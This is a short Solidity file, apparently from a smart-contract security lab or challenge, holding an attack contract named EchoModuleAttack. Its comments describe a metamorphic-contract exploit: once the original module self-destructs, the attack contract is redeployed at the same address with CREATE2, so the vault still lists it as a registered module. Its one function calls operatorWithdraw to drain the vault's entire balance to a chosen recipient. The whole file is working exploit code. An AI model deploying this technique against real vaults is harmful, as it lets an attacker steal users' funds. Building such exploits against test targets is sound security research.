// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

// Import the interface so we can call operatorWithdraw properly
import "targets/sentinel/interfaces/ISentinelVault.sol";

contract EchoModuleAttack {
    // This will be deployed at the SAME address as the original EchoModule
    // after selfdestruct + CREATE2 redeploy. The vault still thinks this
    // address is a registered module, so operatorWithdraw will succeed.
    function attack(address _vault, address _recipient) external {
        // Cast to ISentinelVault so we can call operatorWithdraw (was: raw address call)
        // Use address(_vault).balance instead of nonexistent balanceOf (was: balanceOf(vault))
        ISentinelVault(_vault).operatorWithdraw(_recipient, address(_vault).balance);
    }
}
